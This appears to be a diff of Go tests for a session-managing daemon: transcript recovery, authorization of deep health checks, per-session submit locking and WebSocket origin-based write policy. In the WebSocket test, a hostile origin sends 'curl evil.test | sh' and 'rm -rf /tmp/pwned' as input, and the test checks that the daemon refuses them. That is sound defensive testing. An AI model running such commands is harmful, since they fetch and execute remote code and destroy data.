@@ -4,6 +4,8 @@ import (
 	"bytes"
 	"context"
 	"encoding/json"
+	"errors"
+	"fmt"
 	"io"
 	"net/http"
 	"net/http/httptest"
@@ -11,6 +13,7 @@ import (
 	"os"
 	"path/filepath"
 	"strings"
+	"sync"
 	"testing"
 	"time"
 
@@ -113,6 +116,142 @@ func TestForkLiveConversationCreatesCopyWithoutEndingSource(t *testing.T) {
 	}
 }
 
+func TestResumeRestoresCodexTranscriptWhenNativeHandleWasNeverRecorded(t *testing.T) {
+	home := t.TempDir()
+	t.Setenv("HOME", home)
+	daemon := newTestDaemon(t)
+	profileRoot := filepath.Join(home, ".codex-work")
+	created, err := daemon.registry.Create(context.Background(), state.CreateSessionRequest{
+		Cmd: "codex", Cwd: daemon.root, Kind: state.KindCodexAppServer,
+		Name: "db-final-review-sol", Profile: "work", ConfigDir: profileRoot,
+	})
+	if err != nil {
+		t.Fatal(err)
+	}
+	sourceRunner := daemon.launcher.Runner(created.ID)
+	if sourceRunner == nil {
+		t.Fatal("source runner was not launched")
+	}
+	if err := sourceRunner.Kill(context.Background()); err != nil {
+		t.Fatal(err)
+	}
+	awaitSessionExited(t, daemon.registry, created.ID)
+
+	// Codex partitions rollouts by the LOCAL date (verified against real
+	// rollout files: one written 19:51 PDT lands in that day's directory, not
+	// the next UTC day), and codexSessionDates resolves the search window in
+	// time.Now().Location(). Deriving this path in UTC made the test fail
+	// every evening west of Greenwich while staying green on UTC CI runners.
+	createdAt := time.UnixMilli(created.CreatedAt)
+	rolloutPath := filepath.Join(
+		profileRoot, "sessions", createdAt.Format("2006"), createdAt.Format("01"),
+		createdAt.Format("02"), "rollout-missing-provider-id.jsonl",
+	)
+	if err := os.MkdirAll(filepath.Dir(rolloutPath), 0o700); err != nil {
+		t.Fatal(err)
+	}
+	conversation := strings.Join([]string{
+		`{"timestamp":"` + createdAt.Format(time.RFC3339Nano) + `","type":"session_meta","payload":{"cwd":"` + daemon.root + `","timestamp":"` + createdAt.Format(time.RFC3339Nano) + `"}}`,
+		`{"timestamp":"` + createdAt.Add(time.Second).Format(time.RFC3339Nano) + `","type":"response_item","payload":{"type":"message","role":"user","content":[{"type":"input_text","text":"Final cold review"}]}}`,
+		`{"timestamp":"` + createdAt.Add(2*time.Second).Format(time.RFC3339Nano) + `","type":"response_item","payload":{"type":"message","role":"assistant","content":[{"type":"output_text","text":"Do not ship yet"}]}}`,
+	}, "\n") + "\n"
+	if err := os.WriteFile(rolloutPath, []byte(conversation), 0o600); err != nil {
+		t.Fatal(err)
+	}
+
+	body := strings.NewReader(`{"target":"` + created.ID + `","historyId":"` + created.ID + `"}`)
+	response := serve(
+		t, daemon.handler, http.MethodPost, "/api/recovery/adopt", body, "127.0.0.1:1", nil,
+	)
+	if response.Code != http.StatusCreated {
+		t.Fatalf("resume status=%d body=%s", response.Code, response.Body.String())
+	}
+	var result recovery.AdoptResult
+	decodeBody(t, response, &result)
+	if !result.OK || !result.TranscriptRecovery || result.ImportedMessages != 2 ||
+		result.SourceHistoryID != created.ID || result.DestinationProvider != "codex" {
+		t.Fatalf("resume result = %+v", result)
+	}
+	resumed, live := daemon.registry.Get(result.LaneID)
+	if !live {
+		t.Fatalf("resumed session %s is not live", result.LaneID)
+	}
+	info := resumed.Info()
+	if info.Profile != "work" || info.ConfigDir != profileRoot ||
+		info.ContinuedFromHistoryID != created.ID || info.ImportedMessageCount != 2 {
+		t.Fatalf("resumed session = %+v", info)
+	}
+	if len(daemon.launcher.Launches) != 2 {
+		t.Fatalf("launch count = %d, want ended source + one successor", len(daemon.launcher.Launches))
+	}
+}
+
+func TestResumeUsesCodexSessionMetaWhenOnlySessionsRowMissesNativeHandle(t *testing.T) {
+	home := t.TempDir()
+	t.Setenv("HOME", home)
+	daemon := newTestDaemon(t)
+	profileRoot := filepath.Join(home, ".codex-work")
+	created, err := daemon.registry.Create(context.Background(), state.CreateSessionRequest{
+		Cmd: "codex", Cwd: daemon.root, Kind: state.KindCodexAppServer,
+		Name: "db-final-review-sol", Profile: "work", ConfigDir: profileRoot,
+	})
+	if err != nil {
+		t.Fatal(err)
+	}
+	sourceRunner := daemon.launcher.Runner(created.ID)
+	if err := sourceRunner.Kill(context.Background()); err != nil {
+		t.Fatal(err)
+	}
+	awaitSessionExited(t, daemon.registry, created.ID)
+
+	providerID := "01234567-89ab-4cde-8fab-0123456789ab"
+	// Codex partitions rollouts by the LOCAL date (verified against real
+	// rollout files: one written 19:51 PDT lands in that day's directory, not
+	// the next UTC day), and codexSessionDates resolves the search window in
+	// time.Now().Location(). Deriving this path in UTC made the test fail
+	// every evening west of Greenwich while staying green on UTC CI runners.
+	createdAt := time.UnixMilli(created.CreatedAt)
+	rolloutPath := filepath.Join(
+		profileRoot, "sessions", createdAt.Format("2006"), createdAt.Format("01"),
+		createdAt.Format("02"), "rollout-"+providerID+".jsonl",
+	)
+	if err := os.MkdirAll(filepath.Dir(rolloutPath), 0o700); err != nil {
+		t.Fatal(err)
+	}
+	conversation := strings.Join([]string{
+		`{"timestamp":"` + createdAt.Format(time.RFC3339Nano) + `","type":"session_meta","payload":{"id":"` + providerID + `","cwd":"` + daemon.root + `","timestamp":"` + createdAt.Format(time.RFC3339Nano) + `"}}`,
+		`{"timestamp":"` + createdAt.Add(time.Second).Format(time.RFC3339Nano) + `","type":"response_item","payload":{"type":"message","role":"user","content":[{"type":"input_text","text":"Final cold review"}]}}`,
+	}, "\n") + "\n"
+	if err := os.WriteFile(rolloutPath, []byte(conversation), 0o600); err != nil {
+		t.Fatal(err)
+	}
+
+	body := strings.NewReader(`{"target":"` + created.ID + `","historyId":"` + created.ID + `"}`)
+	response := serve(
+		t, daemon.handler, http.MethodPost, "/api/recovery/adopt", body, "127.0.0.1:1", nil,
+	)
+	if response.Code != http.StatusCreated {
+		t.Fatalf("resume status=%d body=%s", response.Code, response.Body.String())
+	}
+	var result recovery.AdoptResult
+	decodeBody(t, response, &result)
+	if !result.OK || result.TranscriptRecovery || result.Adoption.ProviderUUID != providerID ||
+		result.LaneID == "" {
+		t.Fatalf("resume result = %+v", result)
+	}
+	resumed, live := daemon.registry.Get(result.LaneID)
+	if !live {
+		t.Fatalf("resumed session %s is not live", result.LaneID)
+	}
+	info := resumed.Info()
+	if info.Profile != "work" || info.ConfigDir != profileRoot || info.ConversationID != providerID {
+		t.Fatalf("resumed session = %+v", info)
+	}
+	if len(daemon.launcher.Launches) != 2 {
+		t.Fatalf("launch count = %d, want ended source + one successor", len(daemon.launcher.Launches))
+	}
+}
+
 type testDaemon struct {
 	config   state.Config
 	registry *state.Registry
@@ -192,12 +331,32 @@ func TestHealthShapeAndStaticUI(t *testing.T) {
 		t.Fatalf("unexpected runner compatibility: %#v", runnerCompatibility)
 	}
 
-	deep := serve(t, daemon.handler, http.MethodGet, "/api/health/deep", nil, "198.51.100.10:4321", nil)
+	// Deep health carries live session IDs and host PIDs, so unlike plain
+	// /api/health it is behind authorization. `sessions doctor` reaches it over
+	// loopback locally and with a per-device token for another machine.
+	anonymousDeep := serve(t, daemon.handler, http.MethodGet, "/api/health/deep", nil, "198.51.100.10:4321", nil)
+	if anonymousDeep.Code != http.StatusUnauthorized {
+		t.Fatalf("anonymous deep health status = %d, want %d; body=%s",
+			anonymousDeep.Code, http.StatusUnauthorized, anonymousDeep.Body.String())
+	}
+	if strings.Contains(anonymousDeep.Body.String(), "sessions") &&
+		strings.Contains(anonymousDeep.Body.String(), "pid") {
+		t.Fatalf("anonymous deep health leaked diagnostics: %s", anonymousDeep.Body.String())
+	}
+	deep := serve(t, daemon.handler, http.MethodGet, "/api/health/deep", nil, "198.51.100.10:4321",
+		http.Header{"Authorization": {"Bearer " + testToken}})
+	if deep.Code != http.StatusOK {
+		t.Fatalf("authorized deep health status = %d, body=%s", deep.Code, deep.Body.String())
+	}
 	decodeBody(t, deep, &body)
 	for _, key := range []string{"uptimeSec", "sessions"} {
 		if _, exists := body[key]; !exists {
 			t.Errorf("deep health missing key %q: %#v", key, body)
 		}
+	}
+	localDeep := serve(t, daemon.handler, http.MethodGet, "/api/health/deep", nil, "127.0.0.1:4567", nil)
+	if localDeep.Code != http.StatusOK {
+		t.Fatalf("loopback deep health status = %d, body=%s", localDeep.Code, localDeep.Body.String())
 	}
 
 	index := serve(t, daemon.handler, http.MethodGet, "/", nil, "198.51.100.10:4321", nil)
@@ -210,19 +369,278 @@ func TestHealthShapeAndStaticUI(t *testing.T) {
 	}
 }
 
+// TestConcurrentSubmitKeepsEachMessageWithItsTarget pins the invariant the
+// submit lock exists for: a message and the Enter that sends it reach a session
+// with no other write to THAT session in between, so two agents submitting to
+// one session never commit each other's half-typed line.
+//
+// It deliberately does not assert a global order across sessions. Submits to
+// different sessions are independent work and are expected to interleave; the
+// previous whole-daemon assertion also pinned the serialisation that made ten
+// agents on ten sessions queue behind each other's settle delay.
+func TestConcurrentSubmitKeepsEachMessageWithItsTarget(t *testing.T) {
+	daemon := newTestDaemon(t)
+	recorder := &recordingSessionInput{sessionService: daemon.registry}
+	daemon.handler.registry = recorder
+	targets := make(map[string][]string)
+	for _, prefix := range []string{"ALPHA", "BRAVO", "CHARLIE"} {
+		created, err := daemon.registry.Create(context.Background(), state.CreateSessionRequest{
+			Cmd: "/bin/bash", Cwd: daemon.root,
+		})
+		if err != nil {
+			t.Fatal(err)
+		}
+		targets[created.ID] = []string{prefix + "-1", prefix + "-2"}
+	}
+	server := httptest.NewServer(daemon.handler)
+	defer server.Close()
+
+	var wait sync.WaitGroup
+	failures := make(chan string, 2*len(targets))
+	for id, texts := range targets {
+		for _, text := range texts {
+			id, text := id, text
+			wait.Add(1)
+			go func() {
+				defer wait.Done()
+				body := strings.NewReader(`{"data":"` + text + `"}`)
+				response, err := http.Post(server.URL+"/api/sessions/"+id+"/submit", "application/json", body)
+				if err != nil {
+					failures <- id + ": " + err.Error()
+					return
+				}
+				defer response.Body.Close()
+				if response.StatusCode != http.StatusOK {
+					encoded, _ := io.ReadAll(response.Body)
+					failures <- id + ": " + response.Status + " " + string(encoded)
+				}
+			}()
+		}
+	}
+	wait.Wait()
+	close(failures)
+	for message := range failures {
+		t.Error(message)
+	}
+
+	recorder.mu.Lock()
+	calls := append([]recordedSessionInput(nil), recorder.calls...)
+	recorder.mu.Unlock()
+	if len(calls) != 4*len(targets) {
+		t.Fatalf("input calls = %#v", calls)
+	}
+	perSession := make(map[string][]string)
+	for _, call := range calls {
+		perSession[call.id] = append(perSession[call.id], call.data)
+	}
+	for id, texts := range targets {
+		got := perSession[id]
+		if len(got) != 4 {
+			t.Fatalf("session %s inputs = %q", id, got)
+		}
+		sent := map[string]bool{}
+		for index := 0; index < len(got); index += 2 {
+			if got[index+1] != "\r" {
+				t.Fatalf("session %s interleaved a write between a message and its Enter: %q", id, got)
+			}
+			sent[got[index]] = true
+		}
+		for _, text := range texts {
+			if !sent[text] {
+				t.Fatalf("session %s inputs = %q, want both of %q", id, got, texts)
+			}
+		}
+		if runnerInputs := daemon.launcher.Runner(id).Inputs(); len(runnerInputs) != 4 {
+			t.Fatalf("runner %s inputs = %q", id, runnerInputs)
+		}
+	}
+	if tracked := daemon.handler.submits.tracked(); tracked != 0 {
+		t.Fatalf("per-session submit locks retained after every submit finished: %d", tracked)
+	}
+}
+
+// TestSubmitsToDifferentSessionsRunConcurrently is the scaling half of the same
+// invariant. Every submit holds its session's lock across a fixed settle delay;
+// with one process-wide lock, N agents on N different sessions took N delays.
+func TestSubmitsToDifferentSessionsRunConcurrently(t *testing.T) {
+	daemon := newTestDaemon(t)
+	const sessions = 8
+	ids := make([]string, 0, sessions)
+	for index := 0; index < sessions; index++ {
+		created, err := daemon.registry.Create(context.Background(), state.CreateSessionRequest{
+			Cmd: "/bin/bash", Cwd: daemon.root,
+		})
+		if err != nil {
+			t.Fatal(err)
+		}
+		ids = append(ids, created.ID)
+	}
+	server := httptest.NewServer(daemon.handler)
+	defer server.Close()
+
+	var ready, wait sync.WaitGroup
+	ready.Add(len(ids))
+	start := make(chan struct{})
+	failures := make(chan string, len(ids))
+	for _, id := range ids {
+		id := id
+		wait.Add(1)
+		go func() {
+			defer wait.Done()
+			ready.Done()
+			<-start
+			body := strings.NewReader(`{"data":"parallel"}`)
+			response, err := http.Post(server.URL+"/api/sessions/"+id+"/submit", "application/json", body)
+			if err != nil {
+				failures <- id + ": " + err.Error()
+				return
+			}
+			defer response.Body.Close()
+			if response.StatusCode != http.StatusOK {
+				encoded, _ := io.ReadAll(response.Body)
+				failures <- id + ": " + response.Status + " " + string(encoded)
+			}
+		}()
+	}
+	ready.Wait()
+	began := time.Now()
+	close(start)
+	wait.Wait()
+	elapsed := time.Since(began)
+	close(failures)
+	for message := range failures {
+		t.Error(message)
+	}
+	// Concurrent: about one settle delay for all of them. Serialised: eight.
+	if limit := 3 * submitSettleDelay; elapsed > limit {
+		t.Fatalf("%d submits to %d different sessions took %s, want under %s: they are serialising on a shared lock",
+			len(ids), len(ids), elapsed, limit)
+	}
+	for _, id := range ids {
+		if got := daemon.launcher.Runner(id).Inputs(); len(got) != 2 || got[0] != "parallel" || got[1] != "\r" {
+			t.Fatalf("runner %s inputs = %q", id, got)
+		}
+	}
+	if tracked := daemon.handler.submits.tracked(); tracked != 0 {
+		t.Fatalf("per-session submit locks retained after every submit finished: %d", tracked)
+	}
+}
+
+type recordedSessionInput struct {
+	id   string
+	data string
+}
+
+type recordingSessionInput struct {
+	sessionService
+	mu    sync.Mutex
+	calls []recordedSessionInput
+}
+
+func (r *recordingSessionInput) Input(ctx context.Context, id, data string) bool {
+	r.mu.Lock()
+	r.calls = append(r.calls, recordedSessionInput{id: id, data: data})
+	r.mu.Unlock()
+	return r.sessionService.Input(ctx, id, data)
+}
+
+func TestAuthenticatedMachineIdentityUsesStableIDAndCurrentName(t *testing.T) {
+	daemon := newTestDaemon(t)
+	unauthorized := serve(t, daemon.handler, http.MethodGet, "/api/machine", nil, "198.51.100.25:5555", nil)
+	if unauthorized.Code != http.StatusUnauthorized {
+		t.Fatalf("remote machine identity status = %d, body = %s", unauthorized.Code, unauthorized.Body.String())
+	}
+	response := serve(t, daemon.handler, http.MethodGet, "/api/machine", nil, "127.0.0.1:4321", nil)
+	if response.Code != http.StatusOK {
+		t.Fatalf("machine identity status = %d, body = %s", response.Code, response.Body.String())
+	}
+	var body struct {
+		MachineID string `json:"machine_id"`
+		Name      string `json:"name"`
+	}
+	decodeBody(t, response, &body)
+	if body.MachineID != daemon.handler.identity.ID {
+		t.Fatalf("machine id = %q, want %q", body.MachineID, daemon.handler.identity.ID)
+	}
+	if body.Name == "" {
+		t.Fatal("machine name is empty")
+	}
+}
+
 func TestKnownMutationRoutesReturnMethodNotAllowed(t *testing.T) {
 	daemon := newTestDaemon(t)
+	info, err := daemon.registry.Create(context.Background(), state.CreateSessionRequest{
+		Cmd: "/bin/bash", Cwd: daemon.root,
+	})
+	if err != nil {
+		t.Fatal(err)
+	}
 	for _, path := range []string{
 		"/api/retention/gc",
 		"/api/retention/archive",
 		"/api/worktrees",
 		"/api/worktrees/clean",
 		"/api/lanes",
+		// These four answered 404 for a wrong verb while every sibling
+		// answered 405, so a caller could not tell a mistyped method from a
+		// route or session that does not exist.
+		"/api/providers",
+		"/api/providers/claude/update",
+		"/api/sessions/" + info.ID + "/wait",
+		"/api/sessions/" + info.ID + "/wait-state",
 	} {
 		response := serve(t, daemon.handler, http.MethodPatch, path, nil, "127.0.0.1:4321", nil)
 		if response.Code != http.StatusMethodNotAllowed {
 			t.Errorf("%s status=%d body=%s", path, response.Code, response.Body.String())
 		}
+	}
+	// A wrong verb is still 405 for a session that does not exist, and a
+	// correct verb still reports the missing session as 404.
+	missing := serve(t, daemon.handler, http.MethodPatch, "/api/sessions/missing/wait", nil, "127.0.0.1:4321", nil)
+	if missing.Code != http.StatusMethodNotAllowed {
+		t.Errorf("PATCH wait on missing session status=%d body=%s", missing.Code, missing.Body.String())
+	}
+	found := serve(t, daemon.handler, http.MethodGet, "/api/sessions/missing/wait", nil, "127.0.0.1:4321", nil)
+	if found.Code != http.StatusNotFound {
+		t.Errorf("GET wait on missing session status=%d body=%s", found.Code, found.Body.String())
+	}
+}
+
+type tagsFailureRegistry struct {
+	sessionService
+	err error
+}
+
+func (r *tagsFailureRegistry) Tags(string) (map[string]string, error) { return nil, r.err }
+
+// TestSessionTagsReadSeparatesMissingSessionFromReadFailure pins GET /tags to
+// the same distinction its own PUT already made. Reporting an unreadable tag
+// file as 404 told an agent its session was gone.
+func TestSessionTagsReadSeparatesMissingSessionFromReadFailure(t *testing.T) {
+	daemon := newTestDaemon(t)
+	info, err := daemon.registry.Create(context.Background(), state.CreateSessionRequest{
+		Cmd: "/bin/bash", Cwd: daemon.root,
+	})
+	if err != nil {
+		t.Fatal(err)
+	}
+	daemon.handler.registry = &tagsFailureRegistry{
+		sessionService: daemon.registry,
+		err:            errors.New("read session tags: permission denied"),
+	}
+	unreadable := serve(t, daemon.handler, http.MethodGet, "/api/sessions/"+info.ID+"/tags", nil, "127.0.0.1:1", nil)
+	if unreadable.Code != http.StatusInternalServerError ||
+		!strings.Contains(unreadable.Body.String(), "permission denied") {
+		t.Fatalf("unreadable tags status=%d body=%s", unreadable.Code, unreadable.Body.String())
+	}
+
+	daemon.handler.registry = &tagsFailureRegistry{
+		sessionService: daemon.registry,
+		err:            fmt.Errorf("%w: session %s", state.ErrSessionNotFound, "missing"),
+	}
+	gone := serve(t, daemon.handler, http.MethodGet, "/api/sessions/"+info.ID+"/tags", nil, "127.0.0.1:1", nil)
+	if gone.Code != http.StatusNotFound {
+		t.Fatalf("missing session tags status=%d body=%s", gone.Code, gone.Body.String())
 	}
 }
 
@@ -805,6 +1223,15 @@ func TestWebSocketSingleMuxAndHandshakePolicy(t *testing.T) {
 	if message["type"] != "inputAck" || message["ok"] != true {
 		t.Fatalf("mux input ack = %#v", message)
 	}
+	writeWS(t, ctx, mux, map[string]any{"type": "submit", "requestId": "submit-1", "sessionId": info.ID, "data": "atomic message"})
+	message = readWS(t, ctx, mux)
+	if message["type"] != "submitAck" || message["ok"] != true {
+		t.Fatalf("mux submit ack = %#v", message)
+	}
+	inputs := runner.Inputs()
+	if len(inputs) < 2 || inputs[len(inputs)-2] != "atomic message" || inputs[len(inputs)-1] != "\r" {
+		t.Fatalf("mux submit inputs = %q", inputs)
+	}
 	writeWS(t, ctx, mux, map[string]any{"type": "events", "requestId": "events-1", "sessionId": "missing", "tail": 4})
 	message = readWS(t, ctx, mux)
 	if message["type"] != "rpcError" || message["code"] != "not_found" {
@@ -840,6 +1267,182 @@ func TestWebSocketSingleMuxAndHandshakePolicy(t *testing.T) {
 		t.Fatalf("XFF WS token auth: err=%v response=%v", err, response)
 	}
 	xffAuthorized.CloseNow()
+}
+
+// TestWebSocketWriteAuthorityMatchesHTTPAmbientWritePolicy is the WebSocket
+// mirror of TestAuthAndOriginMatrix/"arbitrary localhost port has no ambient
+// write authority". A `/ws` upgrade is a GET, so the state-changing-method
+// origin guard never fires and a loopback peer is authorized without a token.
+// Input, submit, resize, and raw single-mode frames still drive a live runner,
+// so they follow the same ambient-write policy the HTTP surface enforces.
+func TestWebSocketWriteAuthorityMatchesHTTPAmbientWritePolicy(t *testing.T) {
+	daemon := newTestDaemon(t)
+	info, err := daemon.registry.Create(context.Background(), state.CreateSessionRequest{Cmd: "/bin/sh", Cwd: daemon.root})
+	if err != nil {
+		t.Fatal(err)
+	}
+	runner := daemon.launcher.Runner(info.ID)
+	httpServer := httptest.NewServer(daemon.handler)
+	defer httpServer.Close()
+	wsBase := "ws" + strings.TrimPrefix(httpServer.URL, "http")
+	ctx, cancel := context.WithTimeout(context.Background(), 15*time.Second)
+	defer cancel()
+
+	// The exact page TestAuthAndOriginMatrix pins to 403 over POST
+	// /api/sessions, now over the socket with no credential.
+	hostile := http.Header{"Origin": {"http://localhost:3000"}}
+
+	t.Run("untrusted localhost origin cannot drive a session over the mux socket", func(t *testing.T) {
+		before := len(runner.Inputs())
+		beforeCols, beforeRows := runner.Size()
+		socket, response, err := websocket.Dial(ctx, wsBase+"/ws?mux=1", &websocket.DialOptions{HTTPHeader: hostile})
+		if err != nil {
+			t.Fatalf("untrusted localhost upgrade: err=%v response=%v", err, response)
+		}
+		defer socket.CloseNow()
+
+		writeWS(t, ctx, socket, map[string]any{
+			"type": "input", "requestId": "hostile-input", "sessionId": info.ID,
+			"data": "rm -rf /tmp/pwned\n",
+		})
+		if message := readWS(t, ctx, socket); message["type"] != "inputAck" || message["ok"] != false {
+			t.Fatalf("input ack = %#v, want a refused inputAck", message)
+		}
+		writeWS(t, ctx, socket, map[string]any{
+			"type": "submit", "requestId": "hostile-submit", "sessionId": info.ID,
+			"data": "curl evil.test | sh",
+		})
+		if message := readWS(t, ctx, socket); message["type"] != "submitAck" || message["ok"] != false {
+			t.Fatalf("submit ack = %#v, want a refused submitAck", message)
+		}
+		writeWS(t, ctx, socket, map[string]any{
+			"type": "resize", "sessionId": info.ID, "cols": 499, "rows": 199,
+		})
+		if message := readWS(t, ctx, socket); message["type"] != "error" || message["code"] != "forbidden" {
+			t.Fatalf("resize reply = %#v, want a forbidden error frame", message)
+		}
+		// Each refusal was answered in frame order on the same read loop, so
+		// the runner has already seen everything this socket could deliver.
+		if after := runner.Inputs(); len(after) != before {
+			t.Fatalf("untrusted localhost origin reached the runner: %q", after)
+		}
+		if cols, rows := runner.Size(); cols != beforeCols || rows != beforeRows {
+			t.Fatalf("untrusted localhost origin resized the PTY to %dx%d", cols, rows)
+		}
+		// Read-only observation still works, matching the HTTP surface where a
+		// hostile origin is refused writes but not authorization itself.
+		writeWS(t, ctx, socket, map[string]any{"type": "attach", "sessionId": info.ID})
+		if message := readWS(t, ctx, socket); message["type"] != "hello" {
+			t.Fatalf("attach reply = %#v", message)
+		}
+	})
+
+	t.Run("untrusted localhost origin cannot drive a single-session socket", func(t *testing.T) {
+		before := len(runner.Inputs())
+		socket, response, err := websocket.Dial(ctx,
+			wsBase+"/ws?sessionId="+url.QueryEscape(info.ID), &websocket.DialOptions{HTTPHeader: hostile})
+		if err != nil {
+			t.Fatalf("untrusted localhost single upgrade: err=%v response=%v", err, response)
+		}
+		defer socket.CloseNow()
+		if message := readWS(t, ctx, socket); message["type"] != "hello" {
+			t.Fatalf("single hello = %#v", message)
+		}
+		// Single mode also treats raw binary and unparsable text frames as PTY
+		// input, so both must be refused too.
+		if err := socket.Write(ctx, websocket.MessageBinary, []byte("rm -rf /tmp/pwned\n")); err != nil {
+			t.Fatal(err)
+		}
+		if message := awaitWSType(t, ctx, socket, "error"); message["code"] != "forbidden" {
+			t.Fatalf("binary frame reply = %#v", message)
+		}
+		if err := socket.Write(ctx, websocket.MessageText, []byte("not json at all")); err != nil {
+			t.Fatal(err)
+		}
+		if message := awaitWSType(t, ctx, socket, "error"); message["code"] != "forbidden" {
+			t.Fatalf("non-JSON text frame reply = %#v", message)
+		}
+		writeWS(t, ctx, socket, map[string]any{"type": "input", "data": "whoami\n"})
+		if message := awaitWSType(t, ctx, socket, "error"); message["code"] != "forbidden" {
+			t.Fatalf("single input reply = %#v", message)
+		}
+		if after := runner.Inputs(); len(after) != before {
+			t.Fatalf("untrusted localhost origin reached the runner: %q", after)
+		}
+	})
+
+	t.Run("hosted shell without a credential is read-only", func(t *testing.T) {
+		before := len(runner.Inputs())
+		hosted := http.Header{"Origin": {"https://sessions.somewhere.tech"}}
+		socket, response, err := websocket.Dial(ctx, wsBase+"/ws?mux=1", &websocket.DialOptions{HTTPHeader: hosted})
+		if err != nil || response.StatusCode != http.StatusSwitchingProtocols {
+			t.Fatalf("hosted shell upgrade: err=%v response=%v", err, response)
+		}
+		defer socket.CloseNow()
+		writeWS(t, ctx, socket, map[string]any{
+			"type": "input", "requestId": "hosted-1", "sessionId": info.ID, "data": "whoami\n",
+		})
+		if message := readWS(t, ctx, socket); message["type"] != "inputAck" || message["ok"] != false {
+			t.Fatalf("hosted input ack = %#v, want a refused inputAck", message)
+		}
+		if after := runner.Inputs(); len(after) != before {
+			t.Fatalf("uncredentialed hosted shell reached the runner: %q", after)
+		}
+	})
+
+	// Everything below is a legitimate client that must keep working.
+	for _, allowed := range []struct {
+		name   string
+		target string
+		header http.Header
+	}{
+		// The Windows shell origin `http://tauri.localhost` is absent here on
+		// purpose: allowedOrigin has never admitted that hostname, so its
+		// upgrade is refused before any write question is reached. That is
+		// pre-existing and untouched by this policy.
+		{name: "native macOS shell", target: "/ws?mux=1", header: http.Header{"Origin": {"tauri://localhost"}}},
+		{name: "checked in dev server", target: "/ws?mux=1", header: http.Header{"Origin": {"http://localhost:5273"}}},
+		{name: "daemon same origin", target: "/ws?mux=1", header: http.Header{"Origin": {"http://localhost:8787"}}},
+		{name: "no origin CLI client", target: "/ws?mux=1"},
+		{name: "hosted shell with query token", target: "/ws?mux=1&token=" + testToken, header: http.Header{"Origin": {"https://sessions.somewhere.tech"}}},
+		{name: "untrusted origin with query token", target: "/ws?mux=1&token=" + testToken, header: http.Header{"Origin": {"http://localhost:3000"}}},
+		{name: "untrusted origin with bearer token", target: "/ws?mux=1", header: http.Header{
+			"Origin": {"http://localhost:3000"}, "Authorization": {"Bearer " + testToken},
+		}},
+	} {
+		t.Run(allowed.name+" keeps write authority", func(t *testing.T) {
+			socket, response, err := websocket.Dial(ctx, wsBase+allowed.target,
+				&websocket.DialOptions{HTTPHeader: allowed.header})
+			if err != nil || response.StatusCode != http.StatusSwitchingProtocols {
+				t.Fatalf("upgrade: err=%v response=%v", err, response)
+			}
+			defer socket.CloseNow()
+			before := len(runner.Inputs())
+			writeWS(t, ctx, socket, map[string]any{
+				"type": "input", "requestId": "allowed-1", "sessionId": info.ID, "data": "echo ok\n",
+			})
+			if message := readWS(t, ctx, socket); message["type"] != "inputAck" || message["ok"] != true {
+				t.Fatalf("input ack = %#v, want an accepted inputAck", message)
+			}
+			if after := runner.Inputs(); len(after) != before+1 {
+				t.Fatalf("legitimate client did not reach the runner: %q", after)
+			}
+		})
+	}
+}
+
+// awaitWSType reads until the named message type arrives, skipping replay and
+// live output frames that a socket may legitimately interleave.
+func awaitWSType(t *testing.T, ctx context.Context, connection *websocket.Conn, want string) map[string]any {
+	t.Helper()
+	for attempt := 0; attempt < 32; attempt++ {
+		message := readWS(t, ctx, connection)
+		if message["type"] == want {
+			return message
+		}
+	}
+	t.Fatalf("no %q message arrived", want)
+	return nil
 }
 
 func serve(t *testing.T, handler http.Handler, method, target string, body io.Reader, remote string, headers http.Header) *httptest.ResponseRecorder {
@@ -883,8 +1486,26 @@ func awaitRunnerChange(t *testing.T, runner *prototest.Runner, condition func() 
 	for !condition() {
 		select {
 		case <-runner.Changes():
-		case <-t.Context().Done():
+		case <-time.After(waitConditionBudget):
 			t.Fatal("test ended before fake runner state changed")
+		}
+	}
+}
+
+func awaitSessionExited(t *testing.T, registry *state.Registry, id string) {
+	t.Helper()
+	deadline := time.NewTimer(2 * time.Second)
+	defer deadline.Stop()
+	ticker := time.NewTicker(time.Millisecond)
+	defer ticker.Stop()
+	for {
+		if session, ok := registry.Get(id); ok && session.Info().Exited {
+			return
+		}
+		select {
+		case <-ticker.C:
+		case <-deadline.C:
+			t.Fatalf("session %s did not exit", id)
 		}
 	}
 }
